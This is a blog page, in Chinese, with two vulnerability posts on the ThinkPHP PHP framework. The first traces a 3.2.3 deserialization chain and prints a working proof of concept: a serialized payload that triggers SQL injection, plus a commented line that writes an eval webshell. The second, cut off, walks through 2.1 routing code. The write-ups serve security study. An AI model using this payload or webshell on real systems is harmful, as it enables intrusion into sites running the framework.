<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>cyxin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.0.0'
} </script><meta name="generator" content="Hexo 6.0.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">34</span></a></div></div></div><nav id="nav" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">cyxin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="site-info"><div id="site-title">cyxin</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/07/Thinkphp3.2.3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Thinkphp3.2.3反序列化漏洞复现</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-07</time><div class="content"><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先全局搜索 destruct， 这里的 $this-&gt;img 可控，可以利用其来调用 其他类的destroy() 方法，或者可以用的call() 方法，__call() 方法并没有可以利用的<br><img src="https://img-blog.csdnimg.cn/a48d15617c7b4ef68298ba4426f9de87.png"><br>那就去找 destroy() 方法<br><img src="https://img-blog.csdnimg.cn/9ca44d705f4646c4ad67e984cfa33b34.png"><br>注意这里，destroy() 是有参数的，而我们调用的时候没有传参，这在php5中是可以的，只发出警告，但还是会执行。</p>
<p>但是在php7 里面就会报出错误，不会执行。</p>
<p>所以漏洞需要用php5的环境。<br>继续寻找可利用的delete()方法。</p>
<p>在Think\Model类即其继承类里，可以找到这个方法，还有数据库驱动类中也有这个方法的，thinkphp3的数据库模型类的最终是会调用到数据库驱动类中的。</p>
<p>先看Model类中。<br><img src="https://img-blog.csdnimg.cn/99915fec3498488abfad11ece63b0a16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>注意，如果$options[‘where’]为空，会return掉<br><img src="https://img-blog.csdnimg.cn/9aed181c0ff54634bb8f9a3b5cafe717.png"><br>跟进 getPK() 方法<br><img src="https://img-blog.csdnimg.cn/f4020abc8f0c41c98a4ad38d39ea547b.png"><br>$pk可控 $this-&gt;data可控<br>最终去驱动类的入口在这里<br><img src="https://img-blog.csdnimg.cn/3e8a953802dd4c648d5d3d799affecc9.png" alt="在这里插入图片描述"><br>下面是驱动类的delete方法<br><img src="https://img-blog.csdnimg.cn/ad424b8009c949ab8351ee512655718f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>一开始调用Model类的delete方法的时候，传入的参数是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;sessionName.<span class="variable">$sessID</span></span><br></pre></td></tr></table></figure>
<p>而后面我们执行的时候是依靠数组的，数组是不可以用 字符串连接符的。参数控制不可以利用$this-&gt;sessionName。</p>
<p>但是可以令其为空（本来就是空），会进入Model 类中的delete方法中的第一个if分支，然后再次调用delete方法，把$this-&gt; $data[this−&gt;data[pk] 作为参数传入，这是我们可以控制的！</p>
<p>跟进driver类中的execute() 方法<br><img src="https://img-blog.csdnimg.cn/7a6dd7afd1be44c68f1e9027ac48494c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>跟进 initConnect() 方法<br><img src="https://img-blog.csdnimg.cn/5e9650a0dedb4b649ec1b2f66f423ae6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>跟进connect<br><img src="https://img-blog.csdnimg.cn/23244ce33cbc484f817777486c15de78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>数据库的连接时通过 PDO 来实现的，可以堆叠注入(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true ) 需要指定这个配置。</p>
<p>这里控制 $this-&gt;config 来连接数据库。</p>
<p>driver类时抽象类，我们需要用mysql类来实例化。</p>
<p>到这里一条反序列化触发sql注入的链子就做好了。</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;sessionName=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle= <span class="keyword">new</span> Model();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>]=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;pk=<span class="string">&#x27;jiang&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk]=<span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;table&quot;</span>=&gt;<span class="string">&quot;mysql.user where 1=updatexml(1,concat(0x7e,user()),1)#&quot;</span>,</span><br><span class="line">            <span class="comment">//&quot;table&quot; =&gt; &quot;mysql.user where 1=1;select &#x27;<span class="meta">&lt;?php</span> eval(\$_POST[1]);<span class="meta">?&gt;</span>&#x27; into outfile &#x27;/var/www/html/shell.php&#x27;;#&quot;,//堆叠打开才能用</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;where&quot;</span>=&gt;<span class="string">&quot;1=1&quot;</span></span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> Mysql();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PDO</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> ;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options= <span class="keyword">array</span>(</span><br><span class="line">        PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>, <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        <span class="comment">//PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true,//堆叠打开</span></span><br><span class="line">        );   </span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;config= <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Imagick()));</span><br><span class="line"></span><br></pre></td></tr></table></figure>








</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/07/Thinkphp2.1%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90/">Thinkphp2.1代码执行及路由分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-07</time><div class="content"><p>Dispatcher.class.php这个文件中是url路由，由于第一次正式看路由那块，所以就从头开始一行一行看把。<br>首先是dispatch函数<br>是37行到140行<br>这个函数是做映射用，把url映射到控制器对我们来说算是最重要的一块</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$urlMode</span>  =  C(<span class="string">&#x27;URL_MODEL&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$urlMode</span> == URL_REWRITE ) &#123;</span><br><span class="line">    <span class="comment">//当前项目地址</span></span><br><span class="line">    <span class="variable">$url</span>    =   dirname(_PHP_FILE_);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span> == <span class="string">&#x27;/&#x27;</span> || <span class="variable">$url</span> == <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">        <span class="variable">$url</span>    =   <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$urlMode</span> == URL_COMPAT)&#123;</span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,_PHP_FILE_.<span class="string">&#x27;?&#x27;</span>.C(<span class="string">&#x27;VAR_PATHINFO&#x27;</span>).<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//当前项目地址</span></span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,_PHP_FILE_);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一开始就调用了一个名叫C的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"><span class="variable">$name</span>=<span class="literal">null</span>, <span class="variable">$value</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$_config</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">// 无参数时获取所有</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$name</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_config</span>;</span><br><span class="line">    <span class="comment">// 优先执行设置获取或赋值</span></span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$name</span> = strtolower(<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">if</span> (is_null(<span class="variable">$value</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_config</span>[<span class="variable">$name</span>]) ? <span class="variable">$_config</span>[<span class="variable">$name</span>] : <span class="literal">null</span>;</span><br><span class="line">            <span class="variable">$_config</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 二维数组设置和获取支持</span></span><br><span class="line">        <span class="variable">$name</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$name</span>[<span class="number">0</span>] = strtolower(<span class="variable">$name</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$value</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]]) ? <span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]] : <span class="literal">null</span>;</span><br><span class="line">        <span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]] = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 批量设置</span></span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$name</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_config</span> = array_merge(<span class="variable">$_config</span>, array_change_key_case(<span class="variable">$name</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 避免非法参数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看出这是一个对传入参数进行获取处理以及过滤的函数<br>而URL_MODEL是一个常量表示url的四种模式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="string">&#x27;URL_MODEL&#x27;</span>      =&gt; <span class="number">1</span>,       <span class="comment">// URL访问模式,可选参数0、1、2、3,代表以下四种模式：</span></span><br><span class="line"><span class="comment">// 0 (普通模式); 1 (PATHINFO 模式); 2 (REWRITE  模式); 3 (兼容模式)  默认为PATHINFO 模式，提供最好的用户体验和SEO支持</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.cxyzjd.com/article/u012382791/50845351">四种模式</a><br>根据模式的不同url格式也有不同。这里到没有什么太多可说的。接下来是一长串对二级域名进行处理的，也先跳过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span>(!<span class="built_in">self</span>::routerCheck())&#123;   <span class="comment">// 检测路由规则 如果没有则按默认规则调度URL</span></span><br><span class="line">        <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">        <span class="variable">$var</span>  =  <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]))&#123;</span><br><span class="line">            <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(C(<span class="string">&#x27;APP_GROUP_DENY&#x27;</span>) &amp;&amp; in_array(strtolower(<span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_DENY&#x27;</span>))))) &#123;</span><br><span class="line">                <span class="comment">// 禁止直接访问分组</span></span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)])) &#123;<span class="comment">// 还没有定义模块名称</span></span><br><span class="line">            <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)]  =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_ACTION&#x27;</span>)]  =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">        <span class="comment">// 解析剩余的URL参数</span></span><br><span class="line">        <span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line">        <span class="variable">$_GET</span>   =  array_merge(<span class="variable">$var</span>,<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取分组 模块和操作名称</span></span><br><span class="line">    <span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        define(<span class="string">&#x27;GROUP_NAME&#x27;</span>, <span class="built_in">self</span>::getGroup(C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)));</span><br><span class="line">        <span class="comment">// 加载分组配置文件</span></span><br><span class="line">        <span class="keyword">if</span>(is_file(CONFIG_PATH.GROUP_NAME.<span class="string">&#x27;/config.php&#x27;</span>))</span><br><span class="line">            C(<span class="keyword">include</span> CONFIG_PATH.GROUP_NAME.<span class="string">&#x27;/config.php&#x27;</span>);</span><br><span class="line">        <span class="comment">// 加载分组函数文件</span></span><br><span class="line">        <span class="keyword">if</span>(is_file(COMMON_PATH.GROUP_NAME.<span class="string">&#x27;/function.php&#x27;</span>))</span><br><span class="line">            <span class="keyword">include</span> COMMON_PATH.GROUP_NAME.<span class="string">&#x27;/function.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    define(<span class="string">&#x27;MODULE_NAME&#x27;</span>,<span class="built_in">self</span>::getModule(C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)));</span><br><span class="line">    define(<span class="string">&#x27;ACTION_NAME&#x27;</span>,<span class="built_in">self</span>::getAction(C(<span class="string">&#x27;VAR_ACTION&#x27;</span>)));</span><br><span class="line">    <span class="comment">// URL常量</span></span><br><span class="line">    <span class="comment">// 当前页面地址</span></span><br><span class="line">    <span class="comment">//define(&#x27;__SELF__&#x27;,$_SERVER[&#x27;PHP_SELF&#x27;]);</span></span><br><span class="line">    define(<span class="string">&#x27;__SELF__&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    define(<span class="string">&#x27;__INFO__&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>]);</span><br><span class="line">    <span class="comment">// 当前项目地址</span></span><br><span class="line">    define(<span class="string">&#x27;__APP__&#x27;</span>,PHP_FILE);</span><br><span class="line">    <span class="comment">// 当前模块和分组地址</span></span><br><span class="line">    <span class="variable">$module</span> = defined(<span class="string">&#x27;P_MODULE_NAME&#x27;</span>)?P_MODULE_NAME:MODULE_NAME;</span><br><span class="line">    <span class="keyword">if</span>(defined(<span class="string">&#x27;GROUP_NAME&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$group</span>   = C(<span class="string">&#x27;URL_CASE_INSENSITIVE&#x27;</span>) ?strtolower(GROUP_NAME):GROUP_NAME;</span><br><span class="line">        define(<span class="string">&#x27;__GROUP__&#x27;</span>,(!<span class="keyword">empty</span>(<span class="variable">$domainGroup</span>) || GROUP_NAME == C(<span class="string">&#x27;DEFAULT_GROUP&#x27;</span>) )?__APP__ : __APP__.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$group</span>);</span><br><span class="line">        define(<span class="string">&#x27;__URL__&#x27;</span>,!<span class="keyword">empty</span>(<span class="variable">$domainModule</span>)?__GROUP__.<span class="variable">$depr</span> : __GROUP__.<span class="variable">$depr</span>.<span class="variable">$module</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        define(<span class="string">&#x27;__URL__&#x27;</span>,!<span class="keyword">empty</span>(<span class="variable">$domainModule</span>)?__APP__.<span class="string">&#x27;/&#x27;</span> : 